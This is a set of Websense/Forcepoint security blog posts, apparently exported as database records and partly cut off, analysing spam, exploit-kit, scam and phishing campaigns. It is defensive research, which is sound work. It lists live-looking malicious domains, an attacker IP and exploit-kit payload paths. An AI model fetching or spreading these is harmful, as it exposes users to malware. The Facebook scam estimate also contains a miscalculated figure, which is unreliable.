It also shows how some messages from the same email campaign, as well as similar variants, lead to pharmaceutical sites related to the \"Yambo Family\" group of Web sites.\n \nEXPLOITED \nThe malicious mail reads as follows: \n \n \nAs you can see, the text references hurricanes Irene and Katia, names various, random people in the text, addresses the potential victim by his or her email user name, and suggests that the reader check out a link whose domain name looks, at first glance, to be related to meteorology. \nIn fact, the Web site had nothing to do with the weather, but it did host a malicious page that contained this code:\n\n \nThe metrologyservices.com site was cleaned the next day, and the offending page was removed.\nIf we check out the redirection target, we see that it shares an IP address, 91.228.133.74, with a host of other domains with names that that look equally suspicious:\n\n \nBut it\'s not just the names that are suspicious. These domains are all related to Blackhole exploit kit and/or rogue AV, and we\'ve seen them being accessed through various vectors: \nEmail campaigns, as shown above and below\n  SEO poisoning using compromised WordPress pages -- in fact, searching for page linked in the hurricane email leads to:\nhttp://wordpress.org/support/topic/plugin-add-link-to-facebook-links-are-hijacked-to-softwarepromoru\nhttp://wordpress.org/support/topic/dashboard-virus\n \nIn these cases, the htaccess file has been hacked for SEO poisoning, as seen here: \n\n \nIf we look up the whois information for these domains, we find they were registered to one private person: ivan-sushkin[at]yandex[dot]ru. \nLooking this up leads us to all sorts of interesting information about domains related to that email address, like last year\'s attacks against osCommerce sites: \nhttp://blog.unmaskparasites.com/2010/10/14/htaccess-redirect-to-example-rudirindex-php-2/\nhttp://blog.unmaskparasites.com/2010/11/19/update-on-htaccess-redirects-of-oscommerce-sites/\nhttp://blog.unmaskparasites.com/2011/01/18/another-update-on-the-oscommerce-htaccess-hack/\nhttp://blog.sucuri.net/2010/11/continuing-attacks-against-oscommerce-sites.html\n \nWebsense Security Labs\'™ principal security researcher, Stephan Chenette, using his Fireshark tool, came across a CSS file on a popular sports fan site that was injected with malicious code also redirecting to the same IP address:\n<compromised domain>/modules/mod_activitystream/style.css -> hxxp://protect-secure.ru/culture/index.php\nIt also alternated to other domains, like hxxp://protect-now.ru/upkeys/index.php, hxxp://yourprivacy.ru/product/index.php.\n \nHere\'s an example one of our researchers, Armin Buescher, analyzed, using one of our proprietary tools:\n <compromised domain>/ modules/mod_activitystream/style.css (the compromised URL)\n  checkprivacy.ru / refresh / index.php (redirector)\nyanquihkenu.monbe.be / main.php?page=ee87d5979969cea3 (Blackhole exploit kit)\n \nExploits or payloads hosted on the attack server included:\n\n  yanquihkenu.monbe.be / content/worms.jar\n  yanquihkenu.monbe.be / content/2fdp.php?f=26\n  yanquihkenu.monbe.be / w.php?f=26&e=4\n  yanquihkenu.monbe.be / w.php?f=26&e=6\n  yanquihkenu.monbe.be / GWeather.class\n \nOn September 8, detection of the malware payload on VirusTotal was at 5/44:http://www.virustotal.com/file-scan/report.html?id=56742d301e1b7e62e831d13f6d1cdfd079a78be22c2bf0cbbc3b71eda18338a5-1315505246\n\n  A day later, detection climbed up to 18/44:http://www.virustotal.com/file-scan/report.html?id=56742d301e1b7e62e831d13f6d1cdfd079a78be22c2bf0cbbc3b71eda18338a5-1315567566\n \n Another SEO poisoning example, this time just searching for the term \"automobile\" on Google, came up with this result at number 22:\n \nhxxp://www.cheap-online-automobile-insurance.com/\n \nOn September 12, this site was redirecting to:\n \nhxxp://privacy-check.ru/uptime/index.php (with the same IP address, of course 91.228.133.74).\n \nThe trending topics (email/SEO) are not the only lure the criminals try to use. Here\'s a later example that looks, at first, like a somewhat common \"Secret Shopper\" scam, suggesting you could be a Walmart evaluator:\n\n \nIt leads to this:\n \n\n  \nBlackhole exploit kit: \n\n \nNtWriteFile\n      /Device/HarddiskVolume1/Documents and Settings/victimo/Desktop/0.649734766565878.exe\n    NtCreateProcessEx\n      /Device/HarddiskVolume1/Documents and Settings/victimo/.exe\n    NtWriteFile\n      /Device/HarddiskVolume1/Documents and Settings/victimo/.exe\n    NtCreateProcessEx\n      /Device/HarddiskVolume1/Program Files/Java/jre6/bin/javaws.exe\n    NtCreateProcessEx\n      /Device/HarddiskVolume1/Program Files/Java/jre6/bin/java.exe\n    \n \nOK, I think everyone gets the idea. Whether it\'s topical emails or SEO poisoning, you are going to get served with something unpleasant from \"Ivan Sushkin.\"\n \n SPAMMED\nBut wait! There\'s more!\nLet\'s go back  to the hurricane scares for a minute. There are more of the same type of hurricane emails, sent at the same time, but with different links. These lead to pharmaceutical spam pages, like \"US Drugs\" (shown below):\n \n \n\n \nAnd you think we\'ll leave you with that? No chance! \nA few days later, what better topic to exploit than Labor Day. This time, it\'s with a little adult-themed lure, leading to Canadian Health & Care Mall and US Drugs. Notice how the email body also has random people\'s names, in an effort to give more credibility to the text: \n \n \n\n \nFor further reading about these two \"distinguished\" pharmaceutical establishments, see these entries in the spamtrackers.eu Wiki: \nUS Drugs\nCanadian Health & Care Mall\nYambo Family\n \nSUMMARY\nWhat we see is that the use of hot topics to attract victims to cyber-criminals\' sites is widespread and varied. It can be to exploit their computer, scare them into paying for rogue AV, and/or serve them a spam page (with all the monetary gain to the criminals that comes with the affiliate programs). We can also see how the various vectors are flexible enough to be used for spam or malicious purposes. At the same time, we get an underlying feeling that \"the more things change, the more they stay the same.\" It was quite amusing for us to see how various, unrelated topics from different vectors all led to the same IP address, with domains all registered to the same name. But for a real user, replace the term \"amusing\" with frustrating, risky, or expensive. There\'s no guarantee that the victim will \"just\" get a pharmaceutical spam message, as it is quite common for redirection targets to change between malicious pages hosting exploit kits and more benign spam.\n \nBesides the protection that Websense Email Security and Websense Web Security products offer, we can never emphasize enough how careful users should be when following any link related to current events, even if it seems to come from a known source. Of course, in this case, it\'s a good idea to block access to this particular IP address, but rest assured that the same gang will have other domains registered to other IP addresses.

A huge volume of new content is being created, shared and moved inside and outside our walls every second. The challenge is that much of this data is sensitive and is a major governance and data theft concern. In order to prevent both accidental data loss and malicious data theft organizations need to be able to identify what is and is not sensitive information and be able to accurately categorize sensitive information as it is created without a massive process that intrudes or adds additional steps to content creator. \n\nWe’ve seen this is a real challenge for organizations, so we have been working closely with Microsoft to accurately monitor, identify, categorize, and ensure protection and proper use of sensitive information— as it is being authored. It’s a big challenge and a huge technology hurdle. That said, at the recent Microsoft® BUILD developer conference we demonstrated accurate real-time file classification and data security policy application done automatically, without manual intervention from the author.\n\nWhat we have done is integrate Websense DLP technology with the new File Classification Infrastructure (FCI) capabilities of Microsoft Windows® Server 8. What this means is that Websense DLP accurately identifies and classifies sensitive information - like source code, network diagrams, credit card numbers and customer files. It then applies one or more of our 1100 standard data policies and any custom policies to automatically tag the document and protect its use regardless of where it will travel.\n\nThe real key innovation here is that it is all done as it is being created, without a user even having to give it a second thought.\n\nThis automatic classification and policy enforcement should greatly assist organizations looking to maintain industry compliance and protect themselves from inappropriate use or theft of their data.

The email came from his Yahoo! Mail account and looked in every way legitimate, except that it had no subject and contained only a link. The recipient list, unlike many spam bulk emails, wasn\'t even in alphabetical order.   \n\nAbout an hour later I received another email from the same friend, this time sending a legitimate bulk email to multiple recipients apologizing for spamming them. \n\nEmail spam coming from your account is embarrassing, and in all cases the first thing you should do is change your password because the most likely cause of spam email being sent from your account is that your email password credentials were stolen.\n\nWas His Email Account Hacked? \n\nJack, who I contacted for more details, at first refused to believe that his password was compromised, until I laid out two possible reasons why spam had been sent out from his account and let him decide which was more likely: \n\nYahoo!\'s private key had been stolen and used to sign spam emails.\n	His Yahoo! email password, which he most likely uses on multiple Web sites, was somehow phished or stolen.\nBeing the smart friend that he is, Jack went with option number 2.\n\nDKIM Signatures \n\nLet me share how I came to my conclusion and how DomainKeys Identified Mail (DKIM) verification can be used in analysis to verify that the email sent came from Yahoo!, was not forged, and that his credentials were used to send the email. \n\n\n\nFigure 1: Spam Email - click this link to view the original email with headers removed for privacy reasons.\n\nFor the purposes of this blog post, I\'m going to focus less on what happens to the user when they click on the URL, and more on how we can determine whether the email was sent from Yahoo! using the credentials of the user in question ( I will state that Websense had the URL above categorized into Web and Email Spam as it\'s a Fake Canadian Pharmaceutical website).\n\nWhen you look at an email, much like a Web page, there is more than meets the eye on the details behind that email. Gmail allows you to view the email as we see it above or in its original form, which has more details than the average person would ever want to see. Here is a snippet:\n\n\n\nFigure2 : Spam Email snippet in original form with personal details removed\nOne interesting header in the email is the header called the DKIM signature:\n\n\n\nThe DKIM signature is a signature used by the SMTP receiver of an email to verify that it came from the sender it claims to come from and that the message hasn\'t been tampered with.\n\nDKIM Algorithm \n\nIn this case Gmail received a message from Yahoo!, looked at the DKIM signature, and applied the following algorithm: \n\nTook a SHA-256 as the cryptographic hash of the message.\n	Signed SHA-256 hash using RSA as the public key encryption scheme.\n	Encoded the encrypted hash using Base64.\nSo, for someone to send an email claiming to originate from Yahoo! and pass through a server that checks the DKIM signature, they would have to obtain the private key that Yahoo! uses for signing email messages from Yahoo! mail servers.\n\nVerifying DKIM Signatures  \n\nLet\'s manually verify the DKIM signature to make sure it came from Yahoo!. \n\nTo do this we have to retrieve Yahoo!\'s public key. To retrieve DKIM public keys the SMTP receiver uses DNS and looks at the TXT resource record type.\n\nUsing the s and d fields in the DKIM signature, which stands for the selector, we\'re going to make a manual DNS query for the TEXT resource record type for a host in the form: s._domainkey.d\n\ns1024._domainkey.yahoo.com is the host we\'ll want to do the DNS look up the public key.\n\nWe can programmatically do this with a PERL using a set of scripts I co-wrote with my colleague David Saunders. The first script will pull the public key from the DNS request:\n\n./get_dkim_key.pl s1024._domainkey.yahoo.com\n\nhost: s1024._domainkey.yahoo.com key: k=rsa; t=y; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDrEee0Ri4Juz+QfiWYui/E9UGSXau/2P8LjnTD8V4Unn+2FAZVGE3kL23bzeoULYv4PeleB3gfm JiDJOKU3Ns5L4KJAUUHjFwDebt0NP+sBK0VKeTATL2Yr/S3bT/xhy+1xtj4RkdV7fVxTn56Lb4udUnwuxK4V5b5PdOKj/+XcwIDAQAB; n=A 1024 bit key;\n\nFigure 3: Script to fetch Yahoo! DKIM public key - full script source code can be found here\n\nAs you can see, the script above fetches the DKIM public key which allows us to verify the message. To accomplish this we could use PERL\'s Crypt::OpenSSL::DSA or various other libraries and languages, but instead we\'re going to use a CPAN module Mail::DKIM::Verifier against the initial message that includes the DKIM signature and all lines below to verify whether the message is valid and hasn\'t been tampered with. Mail::DKIM::Verifier will even download the public key so you don\'t have to fetch it explicitly. Here is a script you can use for verification of an email message that includes a DKIM signature:\n\n./dkim_verify.pl message.txt\n\nfile: message.txt\n\npass\n\nmessage.txt passed DKIM validation\n\nFigure 4: DKIM verification script - full script source code can be found here\n\nConclusion\n\nOK, so let\'s tie this all together. We received a SPAM email and wanted to verify that it came from Yahoo! as opposed to an open relay or a server claiming to be Yahoo!. The email message contained a DKIM signature, which we used to  verify the DNS domain, the email sender, and the message integrity. Using the provided scripts, we verified this information, which led us to conclude that:\n\nThe email message was sent from Yahoo!.\n	The headers, including who it was sent from, were not forged.\nAll of this leads us to the conclusion that the person\'s email account that the spam email was sent from was most likely compromised by stolen password credentials. This isn\'t to say that digital certificates can\'t be stolen or replaced, this can happen, e.g. DigiNotar CA, but these types of occurrences are rare.\n\nBack to my friend Jack, a smart technical guy who probably still doesn\'t understand how his credentials were stolen. Upon questioning Jack, he disclosed his password to me, which wasn\'t one I\'d consider easy to brute force, but added that he uses that password on multiple Web sites and had recently signed up for about 4 different sites using that password where he used his email address as his username.\n\nMy advice to everyone is never use your email address password anywhere else but for your email account, and especially not on sites where your user name is your email address and your password is the password you use for that email address. You should realize that Web site databases get compromised all the time, so whether Jack\'s credentials were stolen because he was unknowingly phished, his computer had a keylogger on it, or one of the sites he registered for using his email address and email address password stole it, we\'ll never know. The important thing is that after such an incident to change the password to your email account.\n\nDKIM signatures are used by all major Web-based email providers, including Yahoo!, Gmail, Microsoft Live, etc. If you see a DKIM signature, you can verify the DNS domain of an email sender and the message integrity by using the PERL scripts linked in this blog.\n\nFor More Information on DKIM:\n\nRFC 4870 Domain-Based Email Authentication Using Public Keys Advertised in the DNS (DomainKeys)\n	RFC 4871 DomainKeys Identified Mail (DKIM) Signatures\nPlease leave feedback or comments, so we can make sure to fully address any questions or concerns you have.\nThanks!\n\nStephan Chenette - Principal Security Researcher', 'https://www.forcepoint.com/blog/security-labs/email-spam-using-dkim-verification-analysis\n');

Today, I want to discuss why companies need to change their security strategy to stay ahead of the threats they face. This topic was something that came up a lot last week at the Austin NG security summit.\nTen years ago a great security program consisted of anti-virus, IDS, and firewalls – but now those protections have lost their effectiveness. Unfortunately, those three outdated security technologies now make up a huge portion of InfoSec spend. And the remaining small pittance is allocated to deal with the most advanced threats we have seen. Doesn’t seem like a fair fight does it?\nResearch from Poneman says 90 percent of all companies have been compromised in the last year. Many were targets of advanced malware that compromised web and email channels. Traditional signature-based security measures DO NOT catch these threats. They are too complex and change too fast for those old security measures to keep up.\nCompound that with the fact that IT security is now on the CEO’s radar and the board is asking questions about security strategy. I’ve spoken to hundreds of CISOs and CSOs over the last year and the recent data breach headlines are catching their attention. More than ever the IT team is being asked: What is our current risk posture? How do we reduce risk? What is our situation? Are we going to be compromised? What is our strategy? This is our chance. Using this momentum and interest we must change the way we operate and the way executives think about security programs.\nThe first step is acknowledgement: You have to realize that at some point you will be compromised and the bad guys will get in. It’s not a matter of IF an APT or a targeted attack will strike; it’s a matter of WHEN. There is no silver bullet. \nBut, all is not lost! Once you’ve accepted this, the next step is to begin to change the way you plan. You need to be able to get the tools in place to be able to communicate to executives:   \n“I am going to prevent X amount of attacks. And of the guys that get in, I’m going to know in X amount of time, and I will have them contained in X amount of time. We can significantly reduce the probability that they will be able to access, our most important data.” Make sure you have the technology, people, and processes to back up your claims.\nThis is the new strategy we have to adopt and share. In the next blog, I’ll share the successful strategies I’ve seen from some of the best organizations and CSOs who have adopted this approach. We’ll look at the most common entry and exit points of attacks and how these successful CSOs are focusing their technology investments in those areas.\nIn the meantime, how many of you have had conversations with your executive team about your security posture? Has this increased in frequency in the last year? Let me know in the comments below.', 'https://www.forcepoint.com/insights/cso-road-why-your-security-strategy-needs-change\n');

What happened is known as a DNS hijack or essentially a masked redirect – meaning you’d be redirected but you wouldn’t see it coming. The websites affected all had in common the same Domain Name Registrars. Noted names include Netnames.co.uk and Ascio, although others have been implicated as well. It was these systems that had been hijacked. In fact the websites themselves were free of malware but during the attack people wouldn’t actually reach the correct site.\nA Domain Name System (DNS) acts like a kind of phone book for the internet by converting the words you type in for a web address into a number. By hijacking the system, the hackers were able to send people to the ‘wrong number’. While the attack was taking place they could have chosen to send people to any number (i.e. site) they wanted. There’s an interesting article in The Guardian which talks to the hackers that carried out this attack.\nOne particular challenge noted in another register piece is that \"the domain names are totally out of control of the owners until they can get the registrar to change them back to their own nameservers.\" Also, email sent to the sites while the hack was live would be diverted to the hackers\' site. This presents a real challenge for confidential data also getting into the wrong hands\nThe list of successfully breached companies just keeps growing and growing. Fact.

So what does this mean to everyday businesses owners and managers (companies that aren’t defense contractors or giant corporations)? It means watch out. Below I outline our recent research findings and thoughts - let me know what you think.\n(Please visit the site to view this media)\nAccording to our research, the wildly successful techniques used in state-sponsored attacks are moving down a \"malware adoption lifecycle.\" Yesterday’s million-dollar, well-planned, high-profile attacks are quickly becoming $25 exploit kits available online to armies of low-level hackers. Consider this \"phase two\" of advanced threats. The army of profit-driven hackers is using the same advanced techniques to steal any data that they can get their hands on to sell, fence or ransom. No one is safe, because traditional defenses don’t work against advanced malware. And the cybercriminals are targeting every kind and size of business.\nThis is the part of the story that people need to hear: While the big-name breaches get the headlines, too many companies get lulled into a false sense of security thinking that they are safe because they don’t have state secrets. Our research shows how the advanced techniques used in APT attacks move downstream. From state-sponsored groups, to criminal gangs, and ultimately to individual hackers—they are hitting any business with anything of value. Because that’s where the money is. And it’s easy pickings because antivirus software is defenseless against these advanced methods. Here’s how we see the malware adoption lifecycle playing out in the wild:\n\n\nAurora is a great example. Google announced the attack on January 12, and four days later, the code was publicly available. Within weeks, the exploit was in the wild. Just 18 months later, there were 5,800 exploits using the same code.\n\n\n\nNow we’ve got another issue: how these exploits propagate in kits. Let’s look at CVE-2010-0188, a vulnerability discovered in Adobe Reader. This exploit has been included in two of the most popular kits out there today, Blackhole and Phoenix. These kits combine a large amount of exploits together, but the important thing is that they are very widely available for a relatively low overhead. The threshold for entry is lowered with these kits. Now hackers with a lower level of technical skill can now take advantage of these techniques – the same ones that powered high-profile targeted attacks on major corporations and defense contractors in previous state-sponsored attacks.\n\n\nThis example illustrates the pervasiveness of these exploits and kits, with Blackhole out there on more than 14,000 urls and Phoenix hitting more than 12,000 urls.\nNow, typically, these exploits lose their efficacy the more pervasive they become, but that’s when the issue of patch management also becomes a critical factor. We took a look at one period from last year, and examined the identification of zero days in common applications and the time it took for a patch to be released. We found that over a four month period, even if you were immediately applying patches as they were released, your organization was vulnerable to zero-days 104 days of that time period, or more than 88 percent of the time.\n\n\nNow, how many organizations are completely on top of the patch management game? Some might delay patches or batch them together to deliver at a single time, but what this means is that the longer you delay patches, the longer you extend the length of efficacy for malware and extend the lifecycle of that exploit. That’s why the inclusion of these exploits in kits still happens; even though there are patches… they still work.\nSo when we look at a new 0-day exploit used in a recent, high profile targeted attack (like this Adobe Flash exploit revealed in July), the question is: how long and to what extent will the bad guys use this to steal your data? Even if you aren’t a big government contractor or a giant corporation, if you have IP, you are a target. \n\nIn a month’s time, we are already seeing this on 140 websites. How many of these are being used in targeted attacks preying on the medium sized organization? How long until this one gets included in the biggest kits out there and more money or confidential data is stolen from additional organizations?\nLook, modern malware circumvents AV and firewalls, so you simply can’t rely on these technologies or on patch management to protect your organizations. We need to examine both inbound and outbound content traffic to minimize risk. Because, if you combine these exploits with some well crafted social engineering, organizations will continue to be victimized. Organizations need to examine—in real time—the substance of each website visited and in each email to effectively battle this malware lifecycle.', 'https://www.forcepoint.com/insights/new-research-malware-adoption-lifecycle\n');

In parallel, cyber-criminals also use BlackHat SEO to spread malware. A high social Web ranking is becoming an important tool to receive constant exposure and get messages out to the desired target audiences, hence the race from both personal and business microblog users to boost their recognition. To attract or to be featured on microblog platforms, you need a very large follower base in a very short time.\n\n\n	 Weibo.com, being one of the largest microblog platforms in China with over 200 million users, attracted a different kind of user. Seeing potentially unlimited business opportunities, many users were spoofing as famous companies and celebrities to publish false messages to the public. Weibo recently enforced true identity verification as identify theft became an increased problem. To counter this, ranking \"smoke-screen\" services are popping up, leading to the idea to \"Shua Fen\": purchase followers. The screenshot below shows 2 Weibo accounts with avatars advertising services for \"Microblog, get thousands of followers\", and \"Paid Followers and get verified\". \n\n\n	\n\n\n	 \n\n\n	These services are actively hooking themselves onto other popular Weibo accounts and there are many ways to obtain them, from the above fake followers to top search engine results such as the example below: \n\n\n	\n\n\n	 \n\n\n	For example, you can get 10,000 followers within 10 days by simply paying a fee of 1,300 Chinese Yuan (~USD$200).

A shocking video appears on your friends\' walls and a few curious clicks then trick you into filling in a fake survey and spreading the scam message unintentionally - we have covered such cases before with the Death of Amy Winehouse and Walmart gift card offer. People might ask: how does it work? how many people are involved in the campaign? how long does a campaign last? and what can we do to combat these contaminations? Let us show our recent research on the Web 2.0 campaign.\n \nRoot of Social Network Contamination? \nTaking Facebook as an example, cyber criminals seed messages such as \"Shocking video\", \"Free Facebook credits\", and current hot topics. You may have seen messages on someone\'s wall similar to this:\n\n \nYou may be asked directly to share this post out to all your friends, or it can be done for you in 2 clicks as below...\n\n \nA curious click will lead you to a template site which asks you to click the \"Jaa\" button twice. \"Jaa\" means \"Share\" in Finnish. If you do it, you will share the above message on your wall. Here is the code used to facilitate sharing in the background.\n\n  \nAfter sharing the message, visitors will be redirected to a page to do a survey. My gut feeling tells me that no one is going to get anything out of it except the cyber criminals...\n  \nDuration of the contamination?\nLet\'s take an sample campaign that happened in the middle of July. The title of the campaign is \"FATHER gets TOTALLY Embarrassed after entering Daughters Room\", and here is the snapshot of the campaign in Facebook.\n\n \nThis campaign broke out on July 13th and peaked on July 21st according to our research: we can see in the graph below that there were on average 1600+ visitors online every few seconds on that date. The number then dropped as the URLs were perhaps blocked by the security vendor or the customer was educated by seeing alerts published by security companies. So the campaign lasted about two weeks, and new campaigns will last even less time.\n\n\nPeople are the new \"Worm\"?\nThere was a fresh campaign titled \"This ls what happens when ex GF forgets to turn her vvebcam off\" on Facebook. It started on August 2nd and soon peaked on August 4th. Here is the graph which shows the online visitors every hour on August 4th.\n\n \nThe average number of online visitors every few seconds is 1760. If we assume that every visitor spends 2 minutes on the site for completing the survey or some other reason, let\'s do a rough account:\nThere will be 1,267,200 visitors for this campaign in a day. (24 X 60) / 2 X 1760 = 1,267,200\nIf one in two visitors shares the message on their wall and completes the survey, there will be 633,600 Facebook users involved in the campaign. 1,267,200 / 2 = 633,600\nPeople click to see the shocking video, but most of them should not want to share it with their friends, especially after they are cheated into doing a survey. So I guess most of them will delete the message from their wall page as soon as they find it. Assuming that 99% of the visitors will delete the shocking video message from their wall as soon as they find it, the number of people who really share it will be 6,336.\nAccording to Facebook Statistics, a user has 130 friends on average; therefore 82,368,000 Facebook users are exposed to the message via their friends\' walls. 6,336 X 130 = 823,680\nThe above data was taken from an accounting site (http://whos.amung.us) which is used by cyber criminals.\n\n \nAs Facebook is so popular around the world, people from everywhere may be involved in the worldwide contamination. Look at the map of online users when the US is sleeping:\n\n \nCurrently, the scams only redirect Facebook users to a phishing Web site to complete a scam survey. If this type of contamination directs users to install rogue antivirus software and to exploit kits, the security impact is unthinkable. \n \nI am always on the social Web, what can I do? \n1. Be cautious about suspicious newsfeeds from your friends, and do not click suspicious links. Facebook sometimes gives you warnings, simply cancel them.  Notify your friends about suspicious newsfeeds.\n\n \n2. Clean up your wall page if you happened to be tricked into spreading suspicious content, and report it to Facebook by clicking the \"X\" button on the right corner of the message. \n3. Educate your friends about common threats and scams. \n4. Install a security application such as Defensio™ to protect your account and filter suspicious newsfeeds.\n \nWeb 2.0 Protection and Control? \nWebsense®  is updating the current URL category set.

However, this has not been the case with social networking. They were constantly searching for a new way to set up a service or an Internet portal to help people connect with each other, finding new friends or even old ones. But it was not only Google who tried this: Yahoo and Microsoft also had a strong proposition to win this market with little success. Then all of a sudden, a young chap called Mark Zuckerberg created a brand new concept and made social networking very popular, and in 6 years they managed to climb all the way up to 2nd place in the Alexa ranking, overtaking many big names like YouTube, Apple, Yahoo and Microsoft.\n\n\n\nFacebook came from nowhere, and even challenged Google for the very top rank in popularity. Zuckerberg, as a fresh university graduate, had no experience in how to set up an enormous system like this, but he still smashed it and today is fighting to take the No.1 place as can be seen on the Alexa report.\n\nIt\'s no surprise therefore that Google is constantly looking for a way to beat Facebook and secure their first position. They already have a popular social network called Orkut. OK, it is only popular in some countries like Brazil or India, but still, it proves their concept, they can do it. Also the software giant have done some interesting projects with Google Wave and Google Buzz. None of them really worked out nor got close enough to steal a market share from Facebook, although both got huge attention from the media as well as from users.\n\nNew concepts come and go: Google moved on, and have come up with Google+, which is another brand new concept. Looks like Google will keep trying until they get the perfect recipe for the most delicious cake of social networking. They are probably right in sensing the growing need for something new, and that is proved by the overwhelming interest by millions of Internet users.\n\n\n\nHowever for us, security experts, it is always of keen interest to see if it is going to be more secure than Facebook? Or could it be just a perfect gateway for spammers?\n\nIf we take a look at the key differences between Facebook and Google+, we notice that while on Facebook you need to accept a friend request, on Google+ someone can add you on to their Circles without your prior approval. Later on you may block people - however, it worries me a bit as it makes it fairly easy to use Google+ as a source of Spam messages.\n\nTo test this theory I have just put a test message in my Stream on my existing Google+ account, and shared it with my company email address which was not previously registered by Google in any way. When I shared my stream post, I received an email from Google+ including the content of the message I wrote.\n\n\n\nMalicious invitations and notifications\n\nThe demand for a Google+ account is still high. It is partly the fact that the service is still in beta, and it is kind of cool to tell our friends that we already have an account - it is like saying I am more up-to-date with technology than you are. So if someone receives a message saying ‘This is an invitation to Google+’ there is a big chance that the recipient is very happy about the invitation or perhaps out of curiosity will follow the link without checking its validity.\nAnd here we go, this is the old school security theory again: the weakest link in all security system is the human itself. Even if the interest in getting an account drops in time, as Google+ sends notifications if someone adds you to their Circles, it is only a matter of time before we see similar attacks to old-style Facebook ones - scams using change password phishing mails or the someone added you mail.\n\nDangers of beta stage\nIt is not all about the malicious invitations, and there have been some of these already. Google+ is still in beta which in itself creates further problems. Phishing Web sites are quite often used by cyber criminals: they steal the layout and the look of banks, game portals, Web email services and social networks and drive users to these fake sites to let victims enter their credentials or their sensitive data such as personal information or banking details. The very same can happen with Google+: after a malicious invitation or a fake notification, a user can end up on a fake Web site and unless they notice something strange on the page it is likely they will give up their data.\n\nBut why is this different than any previously seen issue? As Google+ is still in beta, people do not really know what it looks like. And even if they know, as it is in beta it might change at any time without prior notice from the software giant. So it is much easier to mimic a Google+ logon page, steal Google passwords, and use them for further malicious activities like sending spam to all email addresses in the contact list or sharing a stream to the Circles in the Google+ account.\n\nIn addition to this, when creating a Google+ account, Google asks us to download and install a component on our computer in order to be able to make video conferences and multi-party chats called Hangouts. This again is an opportunity for the bad guys to gain from drive-by download attacks on people - as it seems to be quite normal to download and install something when joining this social networking site.\n\n\n\nRecommended Privacy Settings\n\nThe issue of privacy is also part of data security, namely data or information leakage. You may not want to let everybody know about your feelings, for example telling your boss that you are not happy with your job and looking for a new one. Sometimes a post about this kind of thing is harmless or just funny or awkward, but also it can be a way to seek out confidential company data. And that is possibly the biggest challenge today with the use of a social networking site from the company.\n\nGoogle+ uses a different concept to Facebook. Google is based around \'Circles\', groups of people, and we can decide to share only with certain circles and/or individuals, rather than sharing everything with either \'Friends\' only, \'Friends of Friends\' or \'Everyone\'. We still have a similar option for this though with the \'Your circles\' which is equivalent of \'Friends\' in Facebook as that means we share the post with all of the circles we have. \'Extended circles\' is very similar to \'Friends of friends\' and \'Public\' is equivalent to \'Everyone\'.\n\nOverall Google+ gives us a better resolution of sharing options, and that is the key point here: If we do not want to share a news or a status with everyone we have in our circles, we do not have to. For example we may have circles like friends, colleagues and family and may not want to let colleagues and our family know how drunk or silly we were at a party last night. This could be an awesome feature for some, however, there is a little glitch. If one of our friends re-shares it to a different audience, then we can still end up sharing our posts with those we did not want to. Because of this Google implemented the \'Disable Reshare\' option which prevents this from happening.\n\nConclusion\n\nAt the moment it is not easy to get a Google+ account, and this has created an understandable excitement and exclusivity for anyone who has one. Malware authors and spammers are already trying to take advantage of this, so please exercise caution if you do get an invitation to try it out for yourself. At this stage we can only hope that Google\'s security and spam filtering will work well to prevent malicious activities on this new social networking site. Anticipation is growing for when it launches to the wider public. I’m sure the spammers are looking forward to this day too.  Let’s see what happens.', 'https://www.forcepoint.com/security-labs/google-safer-facebook\n');

As broadband access expands in areas such as Africa, Central America and other areas beginning to build out their online infrastructure, the potential for many little Râmnicu Vâlcea’s dotting the globe is turning into a reality.  It doesn’t even have to be in a developing nation, in the US, Canada, Europe, the infrastructure is already in place.

Human error. The robots.txt file was removed by mistake, and a search engine browser plug-in called Yandex.Bar, equivalent to the Google toolbar, sent individual page URLs to the search engine for indexing.\nThis is an example of poor site design combined with bad luck. Sites should not display pages that contain SMS details to a client other than the sender (by using cookies, for example).  In this case, site designers assumed that a unique URL was enough for security.  They were wrong. The search engine\'s browser plug-in transferred each unique URL directly to the search engine, and because they had removed robots.txt, the only blocking entity, the result was a flood of personal data. \nToday we see another leak of personal information about online shoppers listed in Yandex, Google, and other major search engine\'s results. \n\n \nIn today\'s case, robots.txt was again a problem, this time because the file was present but incorrectly configured. The file did not include instructions not to index pages with personal data.

Company representatives explained that after a buyer purchases a product from an online shop, the shop sends a link with purchase status to the buyer via email to a web site that is not password protected. So those pages where indexed by search engines. \nAs a result of this leak, the Russian search engine Yandex has asked web site administrators to review information about robots.txt files and how to use them, so this type of incident does not happen in the future.

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (590, 'Does Mac OS X Need Protection?', 'Forcepoint John BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'Over the last couple of months, the concern of whether Mac OS X has become a greater target for attackers has grown, and rightfully so. The Mac OS X market share has steadily increased, and is currently well above 10 percent. \nFrom the attackers standpoint, what it always comes down to is dollars. At a certain point, if the user-base becomes large enough, then the profit margin to target and exploit these users becomes reasonable for attackers to invest in. Thus, tools, frameworks, and infrastructure are created and in many cases, much of what has already been built for the Windows platform can be reused. Only the malware and exploits have to change to target specific features of the Mac OS X operating system. This is because malware and exploits created for Windows operating systems will not work for Mac OS X. \nThe fact that Mac OS X hasn\'t been a major target up until only recently has given many users a false sense of security. It\'s not uncommon to hear rants from a Mac owner of the inherent security of their invulnerable Mac OS X. The truth is that Macs are as vulnerable as Windows, they just don\'t have the long running history of gaining the focus and attention of both blackhat and whitehat vulnerability researchers and malware authors. I might even go as far as to say Macs are more vulnerable than Windows, because Microsoft has been in the security game longer than Apple and has a very well-established product development life cycle where security testing plays a very large part in the testing process.\n \nMac OS X Vulnerabilities and Active Exploitation\nThere were only 34 vulnerabilities identified for the Mac in 2009; in 2010, that number rose to 175. This last month (June 2011), Apple released Java for Mac OS X 10.5 Update 10 and Java for Mac OS X 10.6 Update 5 to address multiple vulnerabilities. Apple also released Mac OS X 10.6.8 and Security Update 2011-004 to address multiple vulnerabilities. Many of these vulnerabilities allow for remote code execution. The numerous security updates indicate that the days of vulnerability researchers not paying attention to Macs is coming to an end. It\'s also interesting to note that in this year\'sCanSecWest\'s Pwn2Own contest, a fully patched Mac OS X 10.6.6 computer running Safari 5.0.3 was 0wned in less than 5 seconds.\n\n  DIY Crimeware Kits\nYou\'ve probably heard of a few Do-It-Yourself (DIY) crimeware kits for Windows, such as Zeus and SpyEye. DIY crimeware kits are progams that can automatically create malware. Up until now we\'ve only seen crimeware kits that build Windows malware, but this year the Danish IT security company, CSIS Security Group, blogged about Weyland-Yutani BOT, a DIY crimeware kit designed for PCs that is able to target the Mac OS X platform. The builder component of the kit runs on Windows machines and the user has the option 